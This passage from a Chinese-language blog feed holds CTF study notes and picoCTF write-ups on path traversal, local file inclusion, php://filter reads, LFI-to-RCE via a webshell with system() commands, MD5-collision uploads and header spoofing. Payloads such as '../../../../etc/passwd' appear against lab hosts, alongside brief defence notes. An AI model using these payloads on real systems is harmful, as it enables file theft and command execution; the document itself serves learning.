    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day16/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day16/</id>
    <published>2024-09-18T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言 <a href="#前言" class="headerlink"></a></h2><p>本日進度：</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB2 - LFI</a></label></li></ul><span id="more"></span><h2 id="上課紀錄">上課紀錄 <a href="#上課紀錄" class="headerlink"></a></h2><h3 id="path-traversal">Path Traversal <a href="#path-traversal" class="headerlink"></a></h3><h4 id="intro">Intro <a href="#intro" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/GRT0MaA.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>像是類似這樣的網址，如果把 <code>?file=report.pdf</code> 改成<code>?file=../../../../etc/passwd</code> 就有可能得到一些機密資料</p><h4 id="how-to-happen">How to Happen <a href="#how-to-happen" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/mtm74QU.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="常用來被攻擊的路徑">常用來被攻擊的路徑 <a href="#常用來被攻擊的路徑" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/VgXG75C.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>其他可以參考 <a href="https://github.com/w181496/Web-CTF-Cheatsheet?tab=readme-ov-file#lfi">這邊</a></p><h4 id="防禦方式">防禦方式 <a href="#防禦方式" class="headerlink"></a></h4><ul><li>強制加上副檔名<br><img data-src="https://i.imgur.com/iXpCBr4.png" alt="Image"><br>(可以在後面加上 Null Byte <code>%00</code> 來繞過，但在 php5.4已經被修掉了)</li><li>確認路徑前綴<br><img data-src="https://i.imgur.com/z5OgxhK.png" alt="Image"></li></ul><h3 id="lab---pathwalker">Lab - Pathwalker <a href="#lab---pathwalker" class="headerlink"></a></h3><p>到網頁之後她會很好心的告訴你 Flag 的位置，然後你可以用 Path Traversal的方式去找到 Flag 了</p><figure><img data-src="https://i.imgur.com/lM6yIJV.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/d2ASAL1.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---pathwalker---waf">Lab - Pathwalker - waf <a href="#lab---pathwalker---waf" class="headerlink"></a></h3><p>這題有塞了一個正則表達式的 WAF <code>/^apple|banana|cappo$/</code>但其實是有漏洞的，他只要符合</p><ol type="1"><li>apple 開頭</li><li>包含 banana</li><li>結尾是 cappo</li></ol><p>其中一個就算符合 (正確應該是 <code>^(apple|banana|cappo)$</code>)，所以就能很輕鬆地繞過了</p><figure><img data-src="https://i.imgur.com/rI3ylCf.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lfi-local-file-inclusion">LFI (Local File Inclusion) <a href="#lfi-local-file-inclusion" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/qaQZYmG.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>用 include 表示他會自動把檔案 parse ，假設 include 的是 php 就會自動parse 成 php 的東西 (如果本來某個路徑的東西是不能拿的，就可能可以用 LFI拿到，就像下面這樣)</p><figure><img data-src="https://i.imgur.com/7V5vLN7.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>parse 之後有可能會讓一些東西不見，就像是註解的內容，這時候可以用 php偽協議把內容轉成 base64 ，然後再解碼就可以看到原本的內容了</p><figure><img data-src="https://i.imgur.com/ZWrMmcI.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/os8xiem.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>格式:<code>php://filter/{read= / write= / &lt;empty&gt;(自己決定要讀檔還寫檔)}convertor}/resource=&lt;file_path&gt;</code></p><p>convertor: string.rot13, convert.base64-encode,convert.base64-decode, zlib.delate… 參見 <a href="https://www.php.net/manual/en/filters.php">這邊</a></p><p>如果有多個 convertor ，就用 <code>|</code> 來串起來</p><figure><img data-src="https://i.imgur.com/nYetXGd.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---lfi">Lab - lfi <a href="#lab---lfi" class="headerlink"></a></h3><p>將 flag.php 用 base64 列印(<code>?page=php://filter/convert.base64-encode/resource=flag</code>)出來之後再解密就能得到 Flag 了</p><figure><img data-src="https://i.imgur.com/RzdCCsO.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---lfi2rce">Lab - lfi2rce <a href="#lab---lfi2rce" class="headerlink"></a></h3><p>這題要取得在根目錄的 Flag ，直接偷 <a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/blob/main/test.php">別人寫好的webshell</a> 來串起來用就可以了，因為他用的是 <code>eval</code> 所以要用<code>system</code> 來執行 linux 指令，所以只要在後面加上<code>&amp;1=system('ls /')</code> 然後 `&amp;1 = system (‘cat {flag 名稱}’)，就解出來了~</p><figure><img data-src="https://i.imgur.com/wD5XHyP.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="參考資料">參考資料 <a href="#參考資料" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】手把手 Python 教學— 從入門到入侵</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">【成大資安社社課】不是 web3.0 的web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Linux基礎指令與使用者管理</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】淺談網路與H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言 &lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;本日進度：&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;【成大資安社社課】WEB
2 - LFI&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="一直刷 CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="資安" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 鐵人賽 一直刷 CTF - Day15</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day15/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day15/</id>
    <published>2024-09-17T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言 <a href="#前言" class="headerlink"></a></h2><p>本日進度：</p><ul class="task-list"><li><label><input type="checkbox" checked="">3 題 web + 3 題crypto</label></li></ul><span id="more"></span><h2 id="writeup">Writeup <a href="#writeup" class="headerlink"></a></h2><h3 id="第一題search-source">第一題：Search source <a href="#第一題search-source" class="headerlink"></a></h3><p>查了一下發現，可以用 <code>wget -mkEpnp http://example.org</code>的指令把一整個網頁 mirror 下來，之後再用 <code>grep</code> 看有沒有<code>picoctf</code> 字樣就得到 Flag 了</p><figure><img data-src="https://i.imgur.com/4WHKu5s.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="第二題some-assembly-required-1">第二題：Some Assembly Required 1<a href="#第二題some-assembly-required-1" class="headerlink"></a></h3><p>這題本來在看懂他程式碼理解了好久，結果後來隨便點點居然不小心就打開它Assembly 的檔案就得到 Flag 了 owo</p><figure><img data-src="https://i.imgur.com/0kPmVTB.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>後來看別人的 writeup 是要把 <code>./JIFxzHyW8W</code>載下來，然後逆向，但這樣得到的好像就是跟我一樣的東西而已 xdddd</p><h3 id="第三題some-assembly-required-2">第三題：Some Assembly Required 2<a href="#第三題some-assembly-required-2" class="headerlink"></a></h3><p>學上一題一樣，點開來之後滑到最下面就好像看到 Flag 了 … 嗎？</p><figure><img data-src="https://i.imgur.com/Baig43l.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>喔不他好像被加密過了，但我又看不懂他的 WebAssembly，試了一段時間之後沒忍住直接跑去看別人 writeup 了😢 ，這題應該是要把它的wasm 反編譯之後去看裡面的邏輯，就會發現他是把內容跟 8 做 XOR 的結果</p><figure><img data-src="https://i.imgur.com/5DSOR3Y.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>(我是學 <a href="https://ithelp.ithome.com.tw/articles/10285195">這篇</a>)</p><h3 id="第四題interencdec">第四題：interencdec <a href="#第四題interencdec" class="headerlink"></a></h3><p>因為前一個禮拜有點忙都沒有上課，都只有寫題目，Web能寫的都快寫完了，先寫一些簡單的 crypto題目，剩的時間趕快趕課，不然都只是在熟練舊有的東西而已</p><p>把它提供的檔案載下來，然後做兩次 base64 解碼，再用凱薩解密就可以得到Flag 了</p><figure><img data-src="https://i.imgur.com/Gu1YxhG.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/FVv0vbz.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="第五題mod-26">第五題：Mod 26 <a href="#第五題mod-26" class="headerlink"></a></h3><p>這題更簡單，他說適用 rot13 ，所以就能剛剛的凱薩解密改成偏移量 13就能得到結果了</p><figure><img data-src="https://i.imgur.com/Gzfhzmz.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="第六題">第六題： <a href="#第六題" class="headerlink"></a></h3><p>我們得到一張圖片</p><figure><img data-src="https://i.imgur.com/HsvYbv5.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>用 mac 內建的 OCR 可以得到以下字串</p><p><code>16 9 3 15 3 20 6 { 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14 }</code></p><p>感覺數字就是代表第幾個字母，簡單整理一下就能得到 Flag 了</p><figure><img data-src="https://i.imgur.com/T3LbWAj.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="參考資料">參考資料 <a href="#參考資料" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】手把手 Python 教學— 從入門到入侵</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">【成大資安社社課】不是 web3.0 的web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】Linux基礎指令與使用者管理</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">【成大資安社社課】淺談網路與H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言 &lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;本日進度：&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;3 題 web + 3 題
crypto&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="一直刷 CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="資安" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 鐵人賽" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 鐵人賽 一直刷 CTF - Day14</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day14/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day14/</id>
    <published>2024-09-16T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言 <a href="#前言" class="headerlink"></a></h2><p>本日進度：</p><ul class="task-list"><li><label><input type="checkbox" checked="">6 題 web</label></li></ul><span id="more"></span><h2 id="writeup">Writeup <a href="#writeup" class="headerlink"></a></h2><h3 id="第一題findme">第一題：findme <a href="#第一題findme" class="headerlink"></a></h3><p>用他的密碼 <code>test</code> / <code>test!</code>登入，但這樣好像拿不到什麼，打開 Burp Suite 攔截request，發現有下面這兩個請求，有一個<code>/next-page/id=cGljb0NURntwcm94aWVzX2Fs</code> 試著把它用 Base64解碼，然後他會再跳轉一次，有另一個 id ，一樣用 Base64解碼之後合併再一起就得到 Flag 了</p><figure><img data-src="https://i.imgur.com/JurqiNi.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/8N2c80l.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="第二題secrets">第二題：Secrets <a href="#第二題secrets" class="headerlink"></a></h3><p>點檢查發現 source 裡面有一個資料夾 secret ，所有就連過去看看(記得最後面要加 <code>/</code> 不然會被 redirect 到<code>http://saturn.picoctf.net/secret/</code>)，然後到下一個頁面後又發現有個資料夾 hidden ，連過去又有個資料夾<code>superhidden</code> ，再連過去之後就看到 Flag 了</p><figure><img data-src="https://i.imgur.com/NnVrlp7.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/UCD9hZ5.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/3ZdYj17.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/YVO0WGz.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="第三題roboto-sans">第三題：Roboto Sans <a href="#第三題roboto-sans" class="headerlink"></a></h3><p>這題看了好久才想到要去看 <code>robots.txt</code> ，裡面有一些看起來像base64 編碼後過的東西，上下兩行不太知道是什麼，中間那行解出來是<code>js/myfile.txt</code> ，所以就去看 <code>js/myfile.txt</code>就得到 Flag 了</p><figure><img data-src="https://i.imgur.com/zdJtIB2.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/acGFowS.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/HdWPVny.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="第四題who-are-you">第四題：Who are you? <a href="#第四題who-are-you" class="headerlink"></a></h3><p>這題很好玩，他是昨天把 <code>User-Agent</code> 改成<code>picobrowser</code>的進階版，這次要改的東西更多，但他都有給提示，慢慢查一個個加到 Header裡面就完成了，分別是 <code>User-Agent</code> <code>Referer</code><code>Date</code> <code>DNT</code> <code>X-Forwarded-For</code><code>Accept-Language</code> ，這些都改成他想要的之後就能得到 Flag了</p><figure><img data-src="https://i.imgur.com/D0TWN28.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/aGCEPCf.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/jxwsbkn.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/0KYHVMt.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/gUxGPKj.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/6xnFkJB.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/P6e6nSb.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/rVhV8iN.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="第五題it-is-my-birthday">第五題：It is my Birthday <a href="#第五題it-is-my-birthday" class="headerlink"></a></h3><p>這題是要上傳兩個 PDF，要滿足內容不相同，但是 MD5 Hash相同，所以我先用 Burp Suite 把請求抓下來，然後上網找到兩個會碰撞的 MD5Hash :<code>TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak</code>和<code>TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak</code>，並分別把他們當成PDF 的內容，上傳上去之後就能得到 Flag 了</p><figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>mercury.picoctf.net:57247</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>575</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://mercury.picoctf.net:57247</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryvOuQVRQUS71gBftB</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://mercury.picoctf.net:57247/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryvOuQVRQUS71gBftB</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>="file1"; filename="test.pdf"</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/pdf</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryvOuQVRQUS71gBftB</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>="file2"; filename="test.pdf"</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/pdf</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryvOuQVRQUS71gBftB</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>="submit"</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">Upload</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryvOuQVRQUS71gBftB--</span></span></span><br></pre></td></tr></tbody></table></figure><figure><img data-src="https://i.imgur.com/Rf6b5uB.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/TiVm1g4.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="第六題">第六題： <a href="#第六題" class="headerlink"></a></h3><p>網頁中的 js 被 <code>obfuscation</code> 了，有夠醜，先拿 prettier格式化，再仔細看看，感覺跟之前有一題 <code>dont-use-client-side</code>很像，但很多東西被打亂了，不過可以從<code>checkpass[_0x4b5b("0x2")](, )</code> 判斷出密碼的順序是<code>_0x4b5b("0x3")</code> -&gt; <code>_0x4b5b("0x4")</code> -&gt;<code>_0x4b5b("0x6")</code> -&gt;<code>_0x4b5b("0x5")</code>，把它印出來之後就是 Flag 了～</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x5a46 = [</span><br><span class="line">  <span class="string">"0a029}"</span>,</span><br><span class="line">  <span class="string">"_again_5"</span>,</span><br><span class="line">  <span class="string">"this"</span>,</span><br><span class="line">  <span class="string">"Password\x20Verified"</span>,</span><br><span class="line">  <span class="string">"Incorrect\x20password"</span>,</span><br><span class="line">  <span class="string">"getElementById"</span>,</span><br><span class="line">  <span class="string">"value"</span>,</span><br><span class="line">  <span class="string">"substring"</span>,</span><br><span class="line">  <span class="string">"picoCTF{"</span>,</span><br><span class="line">  <span class="string">"not_this"</span>,</span><br><span class="line">];</span><br><span class="line">(<span class="keyword">function</span> (<span class="params">_0x4bd822, _0x2bd6f7</span>) {</span><br><span class="line">  <span class="keyword">var</span> _0xb4bdb3 = <span class="keyword">function</span> (<span class="params">_0x1d68f6</span>) {</span><br><span class="line">    <span class="keyword">while</span> (--_0x1d68f6) {</span><br><span class="line">      _0x4bd822[<span class="string">"push"</span>](_0x4bd822[<span class="string">"shift"</span>]());</span><br><span class="line">    }</span><br><span class="line">  };</span><br><span class="line">  <span class="title function_">_0xb4bdb3</span>(++_0x2bd6f7);</span><br><span class="line">})(_0x5a46, <span class="number">0x1b3</span>);</span><br><span class="line"><span class="keyword">var</span> _0x4b5b = <span class="keyword">function</span> (<span class="params">_0x2d8f05, _0x4b81bb</span>) {</span><br><span class="line">  _0x2d8f05 = _0x2d8f05 - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0x4d74cb = _0x5a46[_0x2d8f05];</span><br><span class="line">  <span class="keyword">return</span> _0x4d74cb;</span><br><span class="line">};</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">verify</span>(<span class="params"></span>) {</span><br><span class="line">  checkpass = <span class="variable language_">document</span>[<span class="title function_">_0x4b5b</span>(<span class="string">"0x0"</span>)](<span class="string">"pass"</span>)[<span class="title function_">_0x4b5b</span>(<span class="string">"0x1"</span>)];</span><br><span class="line">  split = <span class="number">0x4</span>;</span><br><span class="line">  <span class="keyword">if</span> (checkpass[<span class="title function_">_0x4b5b</span>(<span class="string">"0x2"</span>)](<span class="number">0x0</span>, split * <span class="number">0x2</span>) == <span class="title function_">_0x4b5b</span>(<span class="string">"0x3"</span>)) {</span><br><span class="line">    <span class="keyword">if</span> (checkpass[<span class="title function_">_0x4b5b</span>(<span class="string">"0x2"</span>)](<span class="number">0x7</span>, <span class="number">0x9</span>) == <span class="string">"{n"</span>) {</span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        checkpass[<span class="title function_">_0x4b5b</span>(<span class="string">"0x2"</span>)](split * <span class="number">0x2</span>, split * <span class="number">0x2</span> * <span class="number">0x2</span>) ==</span><br><span class="line">        <span class="title function_">_0x4b5b</span>(<span class="string">"0x4"</span>)</span><br><span class="line">      ) {</span><br><span class="line">        <span class="keyword">if</span> (checkpass[<span class="title function_">_0x4b5b</span>(<span class="string">"0x2"</span>)](<span class="number">0x3</span>, <span class="number">0x6</span>) == <span class="string">"oCT"</span>) {</span><br><span class="line">          <span class="keyword">if</span> (</span><br><span class="line">            checkpass[<span class="title function_">_0x4b5b</span>(<span class="string">"0x2"</span>)](split * <span class="number">0x3</span> * <span class="number">0x2</span>, split * <span class="number">0x4</span> * <span class="number">0x2</span>) ==</span><br><span class="line">            <span class="title function_">_0x4b5b</span>(<span class="string">"0x5"</span>)</span><br><span class="line">          ) {</span><br><span class="line">            <span class="keyword">if</span> (checkpass[<span class="string">"substring"</span>](<span class="number">0x6</span>, <span class="number">0xb</span>) == <span class="string">"F{not"</span>) {</span><br><span class="line">              <span class="keyword">if</span> (</span><br><span class="line">                checkpass[<span class="title function_">_0x4b5b</span>(<span class="string">"0x2"</span>)](</span><br><span class="line">                  split * <span class="number">0x2</span> * <span class="number">0x2</span>,</span><br><span class="line">                  split * <span class="number">0x3</span> * <span class="number">0x2</span>,</span><br><span class="line">                ) == <span class="title function_">_0x4b5b</span>(<span class="string">"0x6"</span>)</span><br><span class="line">              ) {</span><br><span class="line">                <span class="keyword">if</span> (checkpass[<span class="title function_">_0x4b5b</span>(<span class="string">"0x2"</span>)](<span class="number">0xc</span>, <span class="number">0x10</span>) == <span class="title function_">_0x4b5b</span>(<span class="string">"0x7"</span>)) {</span><br><span class="line">                  <span class="title function_">alert</span>(<span class="title function_">_0x4b5b</span>(<span class="string">"0x8"</span>));</span><br><span class="line">                }</span><br><span class="line">              }</span><br><span class="line">            }</span><br><span class="line">          }</span><br><span 